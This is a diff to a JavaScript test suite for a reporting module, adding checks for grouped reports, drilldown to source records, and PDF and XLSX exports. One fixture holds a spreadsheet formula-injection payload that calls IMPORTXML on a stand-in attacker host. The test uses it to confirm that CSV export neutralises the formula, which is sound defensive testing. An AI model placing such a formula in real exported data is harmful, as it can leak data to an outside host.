@@ -76,11 +76,21 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
     const stock=await reports.run(database,ctx,actor,{dataset:'stock',columns:['product','sku','location','on_hand'],
       sort:'product',direction:'asc'});
     assert.equal(stock.rows.length,1);assert.equal(Number(stock.rows[0].on_hand),12);
-    assert.match(stock.rows[0].href,/^\/inventory\//);
+    assert.equal(stock.rows[0].href,`/inventory/${product.itemId}`);
+    assert.equal((await owner.get(stock.rows[0].href)).status,200);
     const grouped=await reports.run(database,ctx,actor,{dataset:'stock',groups:['location'],aggregate:'sum',
       measure:'on_hand',sort:'total',direction:'desc',chart:'bar'});
     assert.equal(Number(grouped.rows[0].total),12);
     assert.deepEqual(grouped.columns,['location','total']);
+    const extremes=await reports.run(database,ctx,actor,{dataset:'stock',groups:['location'],
+      aggregate:'maximum',measure:'on_hand',sort:'maximum',direction:'desc',chart:'bar'});
+    assert.equal(Number(extremes.rows[0].maximum),12);
+    const detailSpec=reports.drilldownSpec(grouped.config,['Main'],actor);
+    const detail=await reports.run(database,ctx,actor,detailSpec);
+    assert.equal(detail.rows.length,1);
+    assert.equal(detail.rows[0].product,'Copper Clamp');
+    assert.equal(detail.rows[0].href,`/inventory/${product.itemId}`);
+    assert.throws(()=>reports.drilldownSpec(grouped.config,['Main','other'],actor),/one exact report group/i);
     let reportAttempts=0;
     const repaired=await reportAsk.prepare(database,ctx,'Group stock by location and sum units',{provider:{
       async complete(input){reportAttempts++;
@@ -152,6 +162,14 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
     assert.match(preview.text,/href="\/reports\/builder\?draft=1"/);
     const customize=await owner.get('/reports/builder?draft=1');assert.equal(customize.status,200);
     assert.match(customize.text,/value="Warehouse stock"/);
+    const groupedPreview=await owner.post('/reports/run').type('form').send({_csrf:token,dataset:'stock',
+      title:'Stock by location',groups:['location'],aggregate:'sum',measure:'on_hand',sort:'total',chart:'bar'});
+    assert.match(groupedPreview.text,/See source records/);
+    const drilled=await owner.post('/reports/drilldown').type('form').send({_csrf:csrf(groupedPreview.text),
+      definition:JSON.stringify(grouped.config),groupValues:JSON.stringify(['Main'])});
+    assert.equal(drilled.status,200);
+    assert.match(drilled.text,/Copper Clamp/);
+    assert.match(drilled.text,/Open record/);
     const saved=await owner.post('/reports/save').type('form').send({_csrf:token,dataset:'stock',
       title:'Warehouse stock',columns:['product','sku','location','on_hand'],sort:'product',direction:'asc',
       frequency:'daily',hour:'9'});
@@ -165,7 +183,7 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
     assert.equal(xlsx.status,200);const workbook=readWorkbook(xlsx.body);
     assert.equal(workbook.sheets[0].rows[1][0],'Copper Clamp');
     const pdf=await owner.get(`/reports/saved/${reportId}/export.pdf`).buffer(true).parse(binary);
-    assert.equal(pdf.status,200);assert.match(pdf.body.toString('ascii'),/^%PDF-1\.4/);
+    assert.equal(pdf.status,200);assert.match(pdf.body.toString('ascii'),/^%PDF-1\.[3-7]/);
     const report=await reports.load(database,ctx,actor,reportId);
     assert.equal(report.schedule_frequency,'daily');
     const due=await database.transaction(client=>scheduling.enqueueDue(client,'2026-10-09T09:05:00.000Z'),
@@ -210,5 +228,8 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
     const unsafe={...stock,rows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],
       columns:['product']};
     assert.match(reportExports.csv(unsafe).toString(),/^"product"\r\n"'=IMPORTXML/);
-    assert.throws(()=>reportExports.pdf({...unsafe,config:{title:'Caf\u00e9'}}),/cannot safely represent/);
+    const accented=await reportExports.pdf({...unsafe,config:{title:'Caf\u00e9'}});
+    assert.match(accented.toString('ascii'),/^%PDF-1\.[3-7]/);
+    await assert.rejects(()=>reportExports.pdf({...unsafe,config:{title:'\u4e2d\u6587'}}),
+      /cannot safely represent/);
   });
